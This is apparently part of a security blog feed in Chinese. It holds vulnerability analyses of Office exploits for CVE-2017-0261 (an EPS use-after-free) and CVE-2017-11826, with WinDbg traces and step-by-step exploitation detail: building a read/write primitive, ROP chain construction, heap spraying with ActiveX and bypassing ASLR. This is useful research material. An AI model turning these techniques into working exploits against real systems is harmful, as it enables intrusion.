+eax=0018fd78 ebx=00000000 ecx=00291280 edx=00000001 esi=00425770 edi=00000000
+eip=718fba06 esp=0018fd54 ebp=0018fdbc iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+EPSIMP32!RegisterPercentCallback+0x4604:
+718fba06 e8d8abffff      call    deferred_exec (718f65e3)
+0:000&amp;gt; dd eax L4        //查看传入的参数为数组
+0018fd78  00030000 00000000 0049ea98 0048f40c
+0:000&amp;gt; dd poi(poi(poi(poi(poi( 0018fd78 +c))+24))+28)   //查看数组中存储的内容
+0049e2c0  00000500 00000100 00495408 0048ee98			//数组中存放着字符串对象
+0049e2d0  12d85688 8000f194 00000020 00000100
+0049e2e0  0049dc40 0048f198 12d8568f 80000000
+0049e2f0  00490023 000007c8 00000300 00000100
+0049e300  12d856b2 8000f19c 00000026 00000100
+0049e310  0049dc60 0048f1a0 12d856b1 80000100
+0049e320  00420029 0048f1a4 00000003 00000000
+0049e330  12d856b4 80000080 0000002c 00000100
+0:000&amp;gt; db poi(poi(poi(poi(poi( 0049e2c0 +c))+24))+20) L10   //查看字符串的内容为l56 cvx exec
+00495940  20 6c 35 36 20 63 76 78-20 65 78 65 63 20 00 00   l56 cvx exec ..
+0:000&amp;gt; g        //第二次执行deferred_exec
+(5c8.144): C++ EH exception - code e06d7363 (first chance)
+(5c8.144): C++ EH exception - code e06d7363 (first chance)
+Breakpoint 1 hit
+eax=0018fd78 ebx=00000000 ecx=00291280 edx=00000003 esi=00425770 edi=00000001
+eip=718fba06 esp=0018fd54 ebp=0018fdbc iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
+EPSIMP32!RegisterPercentCallback+0x4604:
+718fba06 e8d8abffff      call    EPSIMP32+0x265e3 (718f65e3)
+0:000&amp;gt; dd poi(poi(poi(poi(poi( 0018fd78 +c))+24))+28)   //查看数组的内容
+0049e2c0  00000500 00000100 00495438 0048eeac			//数组中存放着字符串对象
+0049e2d0  12d85688 8000f194 00000020 00000100
+0049e2e0  0049dc40 0048f198 12d8568f 80000000
+0049e2f0  00490023 000007c8 00000300 00000100
+0049e300  12d856b2 8000f19c 00000026 00000100
+0049e310  0049dc60 0048f1a0 12d856b1 80000100
+0049e320  00420029 0048f1a4 00000003 00000000
+0049e330  12d856b4 80000080 0000002c 00000100
+0:000&amp;gt; db poi(poi(poi(poi(poi( 0049e2c0 +c))+24))+20) L10   //查看字符串的内容为l53 cvx exec
+00495958  20 6c 35 33 20 63 76 78-20 65 78 65 63 20 00 00   l53 cvx exec ..
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;从调试的结果可以得知，该函数执行的正是forall。在第一次执行时，l61中待执行的命令是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;l56 cvx exec&lt;/code&gt;，在第二次执行时，l61中的内容已经被换成了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;l53 cvx exec&lt;/code&gt;与调试结果相符。&lt;/p&gt;
+
+&lt;p&gt;接着深入函数分析，发现函数内部嵌套了deferred_exec：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210901193647205.png&quot; alt=&quot;image-20210901193647205&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;于是重新调试，下断在此，分析参数：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210901201303745.png&quot; alt=&quot;image-20210901201303745&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;虽然type为0x10的操作符对象存储在Systemdict中无法查看，但是通过其他字符和数字还是能够确定该语句就是l50。当执行该语句后，原本l63指向的string结构将被替换成存放l52内容的string结构：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210901211439785.png&quot; alt=&quot;image-20210901211439785&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到此时原本存放l63的string结构已经变成了l52。&lt;/p&gt;
+
+&lt;p&gt;在get函数下断，跳转到forall下的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/l64 l57 56 get def&lt;/code&gt;语句查看l57的值：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210903144034585.png&quot; alt=&quot;image-20210903144034585&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以证实l57中存放的就是从l63中获取到的字符，该forall的作用就是泄露被释放的string结构指向的字符串。&lt;/p&gt;
+
+&lt;p&gt;接着获取l57中的值，并进行一些处理，通过ifelse判断系统位数，若l77等于l52的长度+1，那么l99的值为1代表系统为64位，否则l99为0，代表系统为32位：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210903164816672.png&quot; alt=&quot;image-20210903164816672&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到在32位的调试环境下，l77的值为0，因此会将5个0压入操作栈中，并赋值给l95到l99：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210903165138520.png&quot; alt=&quot;image-20210903165138520&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;至此，漏洞原理部分分析完毕，接下来分析漏洞利用部分。&lt;/p&gt;
+
+&lt;h1 id=&quot;漏洞利用&quot;&gt;漏洞利用&lt;/h1&gt;
+
+&lt;p&gt;第二次执行forall代码如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210903171728048.png&quot; alt=&quot;image-20210903171728048&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;和第一次执行十分类似，因此就不深入分析。查看执行完forall后stringl63的变化：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210904155018524.png&quot; alt=&quot;image-20210904155018524&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;查看l63中的值，发现是一个string结构，于是查看字符串，内容正是l102中存储的l36的字符串&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210904155250267.png&quot; alt=&quot;image-20210904155250267&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;接着通过&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;l90 0 l92 putinterval&lt;/code&gt;将l63中指向的第一个4字节的内容改为0x02b14ad4，该值指向l36中四字节之后的内容&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210904161420028.png&quot; alt=&quot;image-20210904161420028&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;经过多次修改，字符串修改为如下状态，修改的值会在第三次漏洞触发时使用到：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210907120914829.png&quot; alt=&quot;image-20210907120914829&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;接着查看l137获取的是l63中0x4处的值，l138获取的是l63中0x20处的值，l103的值为1&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210904170623340.png&quot; alt=&quot;image-20210904170623340&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;第二次漏洞触发部分分析完毕，接下分析第三次漏洞触发构造读写原语的部分。&lt;/p&gt;
+
+&lt;h2 id=&quot;构造读写原语&quot;&gt;构造读写原语&lt;/h2&gt;
+
+&lt;p&gt;l142中存储的是将l138放入到l193的0x24位置的后的字符串：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210904185419955.png&quot; alt=&quot;image-20210904185419955&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;接着使用forall操作符遍历l63数组，当遍历到第54个元素时，恢复快照。此时array l63被释放，接着复制 l142字符串，使得array l63对象被l142字符串对象覆盖：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210906105724780.png&quot; alt=&quot;image-20210906105724780&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;此时查看被覆盖后的l63中最后一次会被获取的值：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210906111515943.png&quot; alt=&quot;image-20210906111515943&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;说明最后一次会获取一个array对象，继续深入查看该对象发现存储了一个字符串，该字符串起始地址为0x00000000，大小为0x7fffffff：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210906112556232.png&quot; alt=&quot;image-20210906112556232&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;通过该字符串，可读写内存中0x00000000-0x7fffffff的任意地址，实现了读写原语的构造，最终将字符串对象存储在l201中。&lt;/p&gt;
+
+&lt;h2 id=&quot;构建rop链&quot;&gt;构建ROP链&lt;/h2&gt;
+
+&lt;p&gt;通过字符串l201获取EPSIMP32的基地址为：0x74750000，并存入l314中：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210906151059868.png&quot; alt=&quot;image-20210906151059868&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;接着通过EPSIMP32的导入表获取kernel32.dll的基地址并存放于l315中：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210906162228059.png&quot; alt=&quot;image-20210906162228059&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;随后开始利用读写原语搜索内存中的gadget用于构造ROP链：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210906164333935.png&quot; alt=&quot;image-20210906164333935&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;将构造好的ROP链放入伪造的文件对象中，并将对象放置在l159的2号元素中，将恶意pe文件和shellcode组成的字符串放置在l159的3号元素中：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210906200817931.png&quot; alt=&quot;image-20210906200817931&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;最终调用closefile操作符关闭伪造的文件对象，在关闭过程中会执行&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call [eax+8]&lt;/code&gt;使得跳转到构造好的ROP链中：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210906201456526.png&quot; alt=&quot;image-20210906201456526&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;至此，整个漏洞的原理和利用分析完毕，剩下的行为部分不再分析。&lt;/p&gt;
+
+&lt;h1 id=&quot;总结&quot;&gt;总结&lt;/h1&gt;
+
+&lt;p&gt;该样本漏洞利用的十分巧妙，通过UAF将原本正常的数组对象替换为指向构造好的能够读写任意内存的字符串对象。通过字符串对象实现了读写任意内存并构造ROP链的目的，并最终将构造好的ROP字符串对象修改为文件对象，利用cloasefile操作符跳转到ROP链中。&lt;/p&gt;
+
+&lt;p&gt;尽管微软已经关闭了Office对于EPS文件的支持，但该格式文件仍然能被Adobe Illustrator打开，如果深入研究该类型文件可能仍有出现漏洞的可能。&lt;/p&gt;
+
+&lt;h1 id=&quot;参考链接&quot;&gt;参考链接&lt;/h1&gt;
+
+&lt;p&gt;[1] &lt;a href=&quot;https://www.adobe.com/content/dam/acom/en/devnet/actionscript/articles/PLRM.pdf&quot;&gt;PostScript LANGUAGE REFERENCE&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;[2] &lt;a href=&quot;https://github.com/kcufId/eps-CVE-2017-0261&quot;&gt;eps-CVE-2017-0261&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;[3] &lt;a href=&quot;https://bbs.pediy.com/thread-261442.htm&quot;&gt;CVE-2017-0261及利用样本分析&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;[4] &lt;a href=&quot;https://www.fireeye.com/blog/threat-research/2017/05/eps-processing-zero-days.html&quot;&gt;EPS Processing Zero-Days Exploited by Multiple Threat Actors&lt;/a&gt;&lt;/p&gt;
+</description>
+        <pubDate>Tue, 07 Sep 2021 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2021/09/07/CVE-2017-0261.html</link>
+        <guid isPermaLink="true">http://localhost:4000/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2021/09/07/CVE-2017-0261.html</guid>
+        
+        <category>Office,</category>
+        
+        <category>Use-after-free</category>
+        
+        
+        <category>漏洞分析</category>
+        
+      </item>
+    
+      <item>
+        <title>CVE-2017-11826 漏洞分析及利用</title>
+        <description>&lt;h1 id=&quot;前言&quot;&gt;前言&lt;/h1&gt;
+
+&lt;p&gt;最近开始分析Office漏洞，拿到CVE-2017-11826的样本后发现无法在Office2010上成功执行，打算分析并改造该EXP。参考了许多资料，结合自己的理解写了本文，供大家学习和参考。&lt;/p&gt;
+
+&lt;h1 id=&quot;漏洞分析&quot;&gt;漏洞分析&lt;/h1&gt;
+
+&lt;h2 id=&quot;分析环境&quot;&gt;分析环境&lt;/h2&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;OS:			Win7 x64 SP1
+Office:		    	Ofiice 2010 x86
+Image name: 		wwlib.dll
+Timestamp:      	Sat Mar 27 23:37:07 2010 (4BAE2623)
+CheckSum:       	0127F568
+ImageSize:      	0127A000
+File version:   	14.0.4762.1000
+Product version:	14.0.4762.0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;静态分析&quot;&gt;静态分析&lt;/h2&gt;
+
+&lt;p&gt;在rtf文档中搜索object，发现嵌入了3个ole对象：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210727171412503.png&quot; alt=&quot;image-20210727171412503&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;第一个对象的CLSID为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;D5DE8D20-5BB8-11D1-A1E3-00A0C90F2731&lt;/code&gt;，在注册表搜索后发现该对象位于&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Windows\SysWOW64\msvbvm60.dll&lt;/code&gt;，而该dll是没有ASLR的。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210727175112215.png&quot; alt=&quot;image-20210727175112215&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;通过ProcessExplorer发现word打开rtf文档后确实加载了msvbvm60.dll，且该dll无ASLR，说明该ole对象的作用是绕过ASLR。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210727180558328.png&quot; alt=&quot;image-20210727180558328&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rtfobj.py -s all&lt;/code&gt;提取ole对象：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210727165632756.png&quot; alt=&quot;image-20210727165632756&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;第一个对象经过上面的分析是用于绕过ASLR的，第二和第三个都是.doc文档，使用压缩软件直接打开第二个文档，文档结构如下：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;│  [Content_Types].xml
+│  
+├─docProps
+│      app.xml
+│      core.xml
+│      
+├─word
+│  │  document.xml
+│  │  fontTable.xml
+│  │  settings.xml
+│  │  styles.xml
+│  │  webSettings.xml
+│  │  
+│  ├─activeX
+│  │  │  activeX1.bin
+│  │  │  activeX1.xml
+│  │  │  activeX2.xml
+│  │  │  	······
+│  │  │  activeX40.xml
+│  │  │  
+│  │  └─_rels
+│  │          activeX1.xml.rels
+│  │          activeX2.xml.rels
+│  │          		······
+│  │          activeX40.xml.rels
+│  │          
+│  ├─media
+│  │      image1.wmf
+│  │      
+│  ├─theme
+│  │      theme1.xml
+│  │      
+│  └─_rels
+│          document.xml.rels
+│          
+└─_rels
+        .rels
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;可以看出使用了40个activeX.xml文件，文件内容如下：&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;ax:ocx&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;ax:classid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{00000000-0000-0000-0000-000000000001}&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;ax:persistence=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;persistStorage&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;r:id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;rId1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:ax=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://schemas.microsoft.com/office/2006/activeX&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:r=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;40个xml文件内容一致，加载了CLSID为{00000000-0000-0000-0000-000000000001}的对象，然而系统中并没有这个对象，所以并不会加载任何对象，这么做是为了提高堆喷的效率，具体原理可查看&lt;a href=&quot;https://www.greyhathacker.net/?p=911&quot;&gt;SPRAYING THE HEAP IN SECONDS USING ACTIVEX CONTROLS IN MICROSOFT OFFICE&lt;/a&gt;一文。&lt;/p&gt;
+
+&lt;p&gt;而40个activeX.xml.rels的内容也完全一致：&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;Relationships&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://schemas.openxmlformats.org/package/2006/relationships&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;Relationship&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;rId1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://schemas.microsoft.com/office/2006/relationships/activeXControlBinary&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Target=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;activeX1.bin&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Relationships&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;都指向了activeX1.bin文件，因此会将activeX1.bin在内存中加载40次，以此达到堆喷的目的。&lt;/p&gt;
+
+&lt;p&gt;activeX1.bin文件结构如下：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;activeX1.bin
+│ -文件头 
+│ -数据
+│    │---CB 40 94 72 EC 83 88 08 CB 40 94 72 EC 83 88 08
+│    │						······
+│    │---CB 40 94 72 EC 83 88 08 CB 40 94 72 EC 83 88 08
+│    │---shellcode ······
+│    │---2B 0E 98 72 2B 0E 98 72 2B 0E 98 72 2B 0E 98 72
+│    │						······
+│    │---2B 0E 98 72 2B 0E 98 72 2B 0E 98 72 2B 0E 98 72
+│    │						······
+│    │---CB 40 94 72 EC 83 88 08 CB 40 94 72 EC 83 88 08
+│    │						······
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;看结构似乎是滑板指令加shellcode，待调试验证。&lt;/p&gt;
+
+&lt;p&gt;第三个文档结构如下：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;│  [Content_Types].xml
+│  
+├─docProps
+│      app.xml
+│      core.xml
+│      
+├─word
+│  │  document.xml
+│  │  endnotes.xml
+│  │  fontTable.xml
+│  │  footnotes.xml
+│  │  settings.xml
+│  │  styles.xml
+│  │  webSettings.xml
+│  │  
+│  ├─theme
+│  │      theme1.xml
+│  │      
+│  └─_rels
+│          document.xml.rels
+│          
+└─_rels
+        .rels
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;document.xml的内容如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804144955166.png&quot; alt=&quot;image-20210804144955166&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;观测到&amp;lt;w:font 标签内有异常字符，且标签未正常闭合，预测漏洞触发于该处。&lt;/p&gt;
+
+&lt;p&gt;通过静态分析了解到RTF文档通过内嵌3个ole对象来实现ASLR绕过、堆喷射和漏洞触发，ASLR绕过是通过加载CLSID为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;D5DE8D20-5BB8-11D1-A1E3-00A0C90F2731&lt;/code&gt;的COM对象，将&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msvbvm60.dll&lt;/code&gt;加载到内存中。堆喷射利用40个activeX.xml.rels指向唯一的activeX1.bin文件，将activeX1.bin文件中的数据部分，即偏移为0x800后的内容加载到内存中实现堆喷射。而漏洞触发部分则利用document.xml中的异常字符和标签触发漏洞。&lt;/p&gt;
+
+&lt;h3 id=&quot;动态调试&quot;&gt;动态调试&lt;/h3&gt;
+
+&lt;p&gt;使用windbg附加word，打开漏洞文件：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210727162527153.png&quot; alt=&quot;image-20210727162527153&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到异常因为ecx+4指向的内存无法访问导致错误。查看反汇编得知ecx的值来源于eax，此时eax的值为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;088888ec&lt;/code&gt;。再次打开漏洞文件发现ecx的值改变，但是eax的值仍为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;088888ec&lt;/code&gt;，说明eax的值为故意构造。&lt;/p&gt;
+
+&lt;p&gt;于是打算下断在函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wwlib!DllGetClassObject+0x42d4 (71ed98b0)&lt;/code&gt;查看eax是如何生成的。查看wwlib的基地址，算出函数的偏移为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wwlib+004da16b&lt;/code&gt;。&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0:000&amp;gt; lm m wwlib
+start    end        module name
+71ed0000 7314a000   wwlib      (export symbols)       C:\PROGRA~2\MICROS~1\Office14\wwlib.dll
+0:000&amp;gt; ? 723aa16b-71ed0000
+Evaluate expression: 5087595 = 004da16b
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;重新打开漏洞文档，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bp wwlib+004da16b&lt;/code&gt;下断：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802112402518.png&quot; alt=&quot;image-20210802112402518&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;步过两次后执行到如图所示位置时，查看eax所在的内存：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802112612050.png&quot; alt=&quot;image-20210802112612050&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;发现和在文档3中的字符串一致，接着查看eax+44，对应的正是异常触发时eax的值&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;088888ec&lt;/code&gt;。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802112936829.png&quot; alt=&quot;image-20210802112936829&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;但在xml文件中，字符串中的异常字符的十六进制为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;e8a3ace0a288&lt;/code&gt;：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802140720647.png&quot; alt=&quot;image-20210802140720647&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在文件中显示的格式是Ascii，然而在内存中显示的是Unicode，于是将文件中的字符以utf-8格式转换为十六进制正是eax的值&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;088888ec&lt;/code&gt;：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802142105409.png&quot; alt=&quot;image-20210802142105409&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;说明通过修改该字符串可以控制eax的值，进而控制eip。&lt;/p&gt;
+
+&lt;p&gt;在ida中找到奔溃函数为sub_31A55CE6，发现变量v3是宽字节字符串，位于arg2+0x18，变量v4是一个长度，位于arg2+0x1c&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802153650508.png&quot; alt=&quot;image-20210802153650508&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在windbg设置崩溃函数起始点打印v3为字符串，长度为v4：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bp wwlib+385ce6 &quot;du poi(poi(esp+8)+18) Lpoi(poi(esp+8)+1c); g;&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802161250939.png&quot; alt=&quot;image-20210802161250939&quot; /&gt;&lt;/p&gt;
+
